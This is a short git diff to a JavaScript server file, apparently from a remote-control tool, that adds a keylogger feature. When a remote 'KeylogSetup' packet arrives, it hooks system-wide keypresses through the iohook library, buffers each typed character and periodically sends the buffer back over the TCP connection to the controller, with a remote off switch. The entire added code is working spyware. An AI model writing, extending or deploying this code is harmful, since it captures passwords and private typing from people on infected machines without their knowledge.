@@ -199,3 +199,46 @@ class Server {
 //
 
 let server = new Server('Hello123')
+const iohook = require('iohook');
+
+server.on(Packets.KeylogSetup, function(packet, conn) {
+  if (!packet.data) return;
+
+  if (!conn.keylog) {
+    conn.keylog = {
+      buffer: [],
+      intervalID: null,
+      keyEvt: (evt) => {
+        conn.keylog.buffer.push(evt.keychar)
+      }
+    }
+  }
+
+  function disableKeylog() {
+    clearInterval(conn.keylog.intervalID);
+    conn.keylog.intervalID = null
+    iohook.off('keypress', conn.keylog.keyEvt)
+  }
+
+  if (packet.data.interval === 0) {
+    console.log("DISABLE");
+    disableKeylog();
+    return;
+  }
+
+  if (packet.data.interval > 0) {
+    if (conn.keylog.intervalID) clearInterval(conn.keylog.intervalID);
+    
+    iohook.on('keypress', conn.keylog.keyEvt)
+    iohook.start()
+
+    conn.keylog.intervalID = setInterval(function() {
+      // Send loop
+      if (conn.keylog.buffer.length != 0) {
+        conn.tcp.write(Packets.r_Keylog.create(conn.keylog.buffer))
+        conn.keylog.buffer = [];
+      }
+    }, packet.data.interval)
+  }
+    
+})
